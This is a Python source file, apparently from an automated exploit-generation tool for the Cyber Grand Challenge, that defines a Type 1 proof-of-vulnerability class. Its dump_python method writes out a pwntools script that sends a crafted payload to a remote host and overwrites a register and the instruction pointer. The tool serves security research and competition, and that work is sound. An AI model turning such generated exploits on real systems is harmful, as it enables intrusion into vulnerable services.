from .cgc_exploit import CGCExploit

class CGCType1Exploit(CGCExploit):
    '''
    A CGC exploit object, offers more flexibility than an Exploit object for the sake of the game.
    This should represent a Type 1 POV by allowing you to set many different registers to many different values.
    https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/understanding-cfe-povs.md
    '''

    def __init__(self, crash, register, bypasses_nx, bypasses_aslr):
        '''
        :param crash: a crash object which has been modified to exploit a vulnerability
        '''
        super(CGCType1Exploit, self).__init__(crash, 1, bypasses_nx, bypasses_aslr)

        self.register = register
        self.value_idx = None
        self.final_ip_idx = None
        self._raw_payload = None

    def dump_python(self, filename=None):
        '''
        dump an exploit in the form of a python script
        '''

        payload = """import sys
import time
from pwn import *

if len(sys.argv) < 5:
    print "%s: <host> <port> <value> <final_ip>" % sys.argv[0]
    sys.exit(1)

r = remote(sys.argv[1], sys.argv[2])

value = int(sys.argv[3], 16)
final_ip = int(sys.argv[4], 16)

b = bytearray(\"""" + self._raw_payload.encode('hex') + """\".decode('hex'))
b[""" + str(self.value_idx) + ":" + str(self.value_idx + 4) + """] = p32(value)
b[""" + str(self.final_ip_idx) + ":" + str(self.final_ip_idx + 4) + """] = p32(final_ip)

r.send(b)
"""

        if not filename is None:
            with open(filename, 'w') as f:
                f.write(payload)
        else:
            return payload
